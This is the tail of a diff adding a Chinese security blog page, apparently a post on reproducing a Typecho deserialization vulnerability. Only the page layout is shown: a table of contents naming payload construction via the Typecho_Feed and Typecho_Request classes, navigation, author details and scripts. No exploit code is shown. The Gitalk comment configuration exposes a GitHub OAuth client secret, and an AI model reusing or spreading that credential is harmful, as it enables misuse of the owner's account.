+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i>漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/08/BJDCTF2020-EzPHP/" rel="prev" title="[BJDCTF2020]EzPHP">
+      <i class="fa fa-chevron-left"></i> [BJDCTF2020]EzPHP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/11/15/SWPUCTF-2018-SimplePHP/" rel="next" title="[SWPUCTF 2018]SimplePHP">
+      [SWPUCTF 2018]SimplePHP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#typecho-是什么？"><span class="nav-number">1.</span> <span class="nav-text">typecho 是什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点验证"><span class="nav-number">3.</span> <span class="nav-text">漏洞点验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造-payload"><span class="nav-number">5.</span> <span class="nav-text">构造 payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Typecho-Feed类构造"><span class="nav-number">5.1.</span> <span class="nav-text">Typecho_Feed类构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Typecho-Request-类构造"><span class="nav-number">5.2.</span> <span class="nav-text">Typecho_Request 类构造</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方案"><span class="nav-number">6.</span> <span class="nav-text">修复方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#发散思考"><span class="nav-number">7.</span> <span class="nav-text">发散思考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'd0a7e09182e2220e4a0a39329f749957',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
